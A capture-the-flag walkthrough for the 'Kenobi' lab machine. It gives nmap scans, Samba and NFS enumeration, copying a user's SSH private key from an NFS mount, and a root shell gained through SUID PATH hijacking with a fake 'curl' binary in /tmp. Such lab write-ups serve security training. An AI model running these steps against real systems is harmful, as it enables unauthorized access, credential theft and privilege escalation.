# Kenobi

Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.

Nov 25, 2021

#### Task 1: Deploy the vulnerable machine
- Make sure you're connected to our network and deploy the machine
	- `no answer needed`
- Scan the machine with nmap, how many ports are open?
	- `7`

> I just used `nmap -sC -sV -On nmap $IP` to know the open ports
```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      33037/tcp6  mountd
|   100005  1,2,3      37028/udp6  mountd
|   100005  1,2,3      46789/tcp   mountd
|   100005  1,2,3      60512/udp   mountd
|   100021  1,3,4      38189/udp   nlockmgr
|   100021  1,3,4      42725/tcp6  nlockmgr
|   100021  1,3,4      44907/tcp   nlockmgr
|   100021  1,3,4      54142/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2021-11-25T07:26:40-06:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-11-25T13:26:39
|_  start_date: N/A
|_clock-skew: mean: 1h59m56s, deviation: 3h27m52s, median: -4s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

#### Task 2: Enumerating Samba for shares
- Using the nmap command above, how many shares have been found?
	- `3`

> I just used `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.165.132 -Pn` to get the shares
```
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.165.132\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.165.132\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.165.132\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```
> Then you just have to connect to the smb using `smbclient //10.10.165.132/anonymous` and type `ls` to view the files.

- Once you're connected, list the files on the share. What is the file can you see?
	- `log.txt`
- What port is FTP running on?
	- `21`

> By using the `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.165.132` you can determine the mount

```
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
```

- What mount can we see?
	- `/var`


#### Task 3: Gain initial access with ProFtpd

> By using the `nc 10.10.64.81 21` command we can determine the version of the ProFTPD Server and connect to the server.

- What is the version?
	- `1.3.5`

> I just search the version of proftpd which is `1.3.5` in the `exploit-db.com` then i get the answer for the next question.

- How many exploits are there for the ProFTPd running?
	- `4`

- We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 
	- `no answer needed`

- We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.
	- `no answer needed`

> By following the instructions we will now move into our linux machine then execute the following commands.
```
mkdir /mnt/kenobiNFS
mount 10.10.64.81:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
``` 
The first one is to make a directory in mnt naming it kenobiNFS.
We will mount the /var directory from the IP address to our newly created directory which is kenobiNFS and view its content.

> Then we are going to copy the id_rsa to our current directory.
```
cp /mnt/kenobiNFS/tmp/id_rsa .
```

> And we are going to make id_rsa to read and write only by the root since they like that.
```
chmod 600 id_rsa
```

> Then we just use that id to ssh to kenobi user.
```
ssh -i id_rsa kenobi@10.10.64.81
```

> By looking around in the kenobi directory we can see the user.txt 
```
ls -la
cat user.txt
```

- What is Kenobi's user flag (/home/kenobi/user.txt)?
	- `----------...`


#### Task 4: Privilege Escalation with Path Variable Manipulation
 
> The room talks about the SUID which is dangerous since the user can execute some binaries as root.

> Upon finding the SUID files we can use this command.
```
find / -perm -u=s -type f 2>/dev/null
```

- What file looks particularly out of the ordinary? 
	- `/usr/bin/menu`

> Just type the command itself and it will show 3 options
```
/usr/bin/menu
```

- Run the binary, how many options appear?
	- `3`

> We will execute some command to elevate our privilege 
```
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```
The first command is to change directory to the /tmp directory.

Then we will echo the /bin/sh file into new file curl.

Then change the permissions of the curl file to 777 which is can be read and write by all.

Finally, we are going to export the /tmp to the PATH environment variable so that the curl will execute. 

Then just run the menu file.

- We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!
	- `no answer needed`

> After all of that you will be root and you can cat the root.txt in the root directory

- What is the root flag (/root/root.txt)?
	- `-------...`
